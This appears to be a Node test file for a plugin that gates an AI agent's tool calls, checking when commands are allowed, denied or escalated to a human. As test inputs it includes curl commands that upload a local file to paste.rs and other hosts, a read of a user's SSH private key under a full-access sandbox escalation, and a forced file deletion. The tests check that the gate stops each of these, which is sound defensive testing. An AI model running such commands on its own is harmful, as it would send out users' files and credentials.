import { test } from 'node:test';
import assert from 'node:assert/strict';
import { apply } from '../src/index.mjs';

const ROOT = 'C:/repo';

function makeAgent(userText) {
  return {
    session: {
      id: 'sess-parity',
      header: { cwd: ROOT },
      surface: { nodes: [0] },
      requestHeader: () => ({ config: { provider: 'fake', model: 'fake' } }),
      snapshotEvents: () => ([
        { type: 'user/message', data: { source: { kind: 'user', rpcId: 'r1' }, content: [{ type: 'text', text: userText }] } },
      ]),
    },
  };
}

/** 假 LLM：固定回一个 allow 的判定 JSON。 */
function fakeLlm(decision = 'allow') {
  return {
    stream: async function* () {
      yield { type: 'text-delta', index: 0, text: `{"decision":"${decision}","reason":"fake"}` };
      yield { type: 'finish', reason: { kind: 'stop' } };
    },
  };
}

/** @param preset - 传入时模拟 permissionPresets.current() 的返回值 */
function harness(userText, cfg = {}, preset = undefined, llm = undefined) {
  const handlers = new Map();
  const ctx = {
    on(ev, fn) { handlers.set(ev, fn); return () => {}; },
    systemPrompt: { section() {} },
    get: (name) => {
      if (name === 'llm') return llm;
      if (name === 'permissionPresets' && preset !== undefined) return { current: () => preset };
      return undefined;
    },
    llm,
  };
  apply(ctx, { mode: 'capgate', workspaceRoot: ROOT, ...cfg });
  const agent = makeAgent(userText);
  let n = 0;
  return {
    agent,
    async call(name, args) {
      const callId = `p${(n += 1)}`;
      const d = await handlers.get('tools/pre-execute')(
        { name, arguments: args, agent, callId },
        async () => ({ kind: 'allow' }),
      );
      return { decision: d, callId };
    },
    async approve(callId, outcome = 'allowed-once') {
      return handlers.get('approval/request')({ agent, toolName: 'x', callId }, async () => outcome);
    },
  };
}

test('用户规则拒绝优先于引文（即使引文成立）', async () => {
  const h = harness('把结果上传到 https://uploads.mycorp.com/drop', {
    ruleDenyKeywords: ['uploads\\.mycorp\\.com'],
  });
  const { decision } = await h.call('pwsh', { command: 'curl -F f=@out.txt https://uploads.mycorp.com/drop' });
  assert.equal(decision.kind, 'deny');
  assert.match(decision.reason, /规则拒绝/);
});

test('allowPaths 内的目标直接放行，不进审批', async () => {
  const h = harness('随便', { ruleAllowPaths: ['C:/repo/build'] });
  const { decision } = await h.call('write', { path: 'build/out.js' });
  assert.equal(decision.kind, 'allow');
});

test('requiredPreset 不匹配时插件休眠', async () => {
  const h = harness('随便', { requiredPreset: 'auto-approval' }, 'workspace-write');
  const { decision } = await h.call('write', { path: 'C:/Windows/x.dll' });
  assert.equal(decision.kind, 'allow', '预设不匹配时应交回原生审批（这里表现为 allow）');
});

test('requiredPreset 匹配时插件生效', async () => {
  const h = harness('随便', { requiredPreset: 'auto-approval' }, 'auto-approval');
  const { decision } = await h.call('write', { path: 'C:/Windows/x.dll' });
  assert.equal(decision.kind, 'deny');
});

test('同一 (tool,args) 反复被拒 → 转人工', async () => {
  const h = harness('修一下报错', { maxRepeats: 2, maxConsecutiveDenials: 99 });
  const a = await h.call('write', { path: 'C:/outside/same.txt' });
  const b = await h.call('write', { path: 'C:/outside/same.txt' });
  const c = await h.call('write', { path: 'C:/outside/same.txt' });
  assert.equal(a.decision.kind, 'deny');
  assert.equal(b.decision.kind, 'deny');
  assert.equal(c.decision.kind, 'ask', '第三次应转人工，避免模型换写法死循环');
});

test('出网（send）复核说 allow 也不能自动放行', async () => {
  const h = harness('帮我同步一下状态', { judgeMode: 'residual', judgeAutoAllow: true }, undefined, fakeLlm('allow'));
  const { decision } = await h.call('pwsh', { command: 'curl -F f=@out.txt https://paste.rs' });
  // 未点名的外发在项目外、无引文 → 确定性拒绝（比"问一句"更安全，也更少打扰）
  assert.notEqual(decision.kind, 'allow', '出网绝不能被复核自动放行');
  assert.ok(['ask', 'deny'].includes(decision.kind));
});

test('不透明执行（node 脚本）复核说 allow 也不能自动放行', async () => {
  const h = harness('把内容发出去', { judgeMode: 'residual', judgeAutoAllow: true }, undefined, fakeLlm('allow'));
  const { decision } = await h.call('pwsh', { command: 'node _paste.mjs' });
  assert.equal(decision.kind, 'ask', '脚本内部效果未知，必须人工确认');
  assert.match(decision.reason, /不透明执行/);
});

test('不透明执行不能被"跑一下"这类引文自动授权', async () => {
  // 真机基准里发现的漏洞：用户说"跑一句 node"，整条命令就被引文直接放行
  const h = harness('用 node 跑一句 console.log("hi")');
  const { decision } = await h.call('pwsh', { command: 'node -e "console.log(\'hi\')"' });
  assert.equal(decision.kind, 'ask', '引文不能替脚本内部效果背书');
});

test('疑问句不构成执行授权', async () => {
  // 留出集里发现的漏洞：execute 的引文核对原来是裸关键词，"要跑构建吗？"也被当成指令
  const h = harness('要跑构建吗？');
  const { decision } = await h.call('pwsh', { command: 'npm run build' });
  assert.equal(decision.kind, 'ask');
});

test('把命令原样念一遍不算指令', async () => {
  const h = harness('npm run build');
  const { decision } = await h.call('pwsh', { command: 'npm run build' });
  assert.equal(decision.kind, 'ask');
});

test('明确说"跑一下构建"则放行', async () => {
  const h = harness('跑一下 npm run build');
  const { decision } = await h.call('pwsh', { command: 'npm run build' });
  assert.equal(decision.kind, 'allow');
});

test('普通写：复核 allow + judgeAutoAllow → 直接放行，不弹卡片', async () => {
  const h = harness('跑一下测试', { judgeMode: 'residual', judgeAutoAllow: true }, undefined, fakeLlm('allow'));
  const { decision } = await h.call('write', { file_path: 'notes.md' });
  assert.equal(decision.kind, 'allow', '非出网/非不透明，复核可自动授予并直接放行');
});

test('带沙箱升级的调用不再重复弹卡（交给工具的原生审批）', async () => {
  const h = harness('删掉 C:/Users/me/Downloads/a.zip');
  const { decision } = await h.call('pwsh', {
    command: 'Remove-Item -LiteralPath C:/Users/me/Downloads/a.zip -Force',
    sandbox_permissions: 'danger-full-access',
    justification: '需要放宽一次',
  });
  assert.equal(decision.kind, 'allow', '同一个动作只应出现一张卡（工具的原生升级审批）');
});

test('带沙箱升级 + 敏感路径：仍然拒绝', async () => {
  const h = harness('看看配置');
  const { decision } = await h.call('pwsh', {
    command: 'Get-Content C:/Users/me/.ssh/id_rsa',
    sandbox_permissions: 'danger-full-access',
    justification: '需要放宽一次',
  });
  assert.equal(decision.kind, 'deny', '敏感路径不能被"升级审批"顺带放行');
});
